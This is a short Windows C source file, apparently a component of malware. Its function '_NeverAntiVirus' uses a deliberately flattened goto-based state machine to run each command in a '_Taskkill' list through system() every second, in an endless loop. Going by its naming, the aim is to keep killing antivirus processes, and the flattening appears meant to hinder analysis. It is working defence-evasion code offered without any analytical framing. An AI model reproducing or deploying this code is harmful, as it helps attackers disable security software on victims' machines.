#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>

void _NeverAntiVirus(void)
{
    volatile int state = 1;
    int task_index;  // declared here to be used across states

dispatcher:
    if (state == 1) goto state1;
    if (state == 2) goto state2;
    if (state == 3) goto state3;
    if (state == 4) goto state4;
    if (state == 0) goto end;

state1:
    task_index = 0;
    state = 2;
    goto dispatcher;

state2:
    if (_Taskkill[task_index] != NULL) {
        state = 3;
        goto dispatcher;
    } else {
        state = 4;
        goto dispatcher;
    }

state3:
    system(_Taskkill[task_index]);
    task_index++;
    state = 2;
    goto dispatcher;

state4:
    Sleep(1000);
    state = 1;   // restart the outer loop
    goto dispatcher;

end:
    return;
}
#pragma optimize("", on)
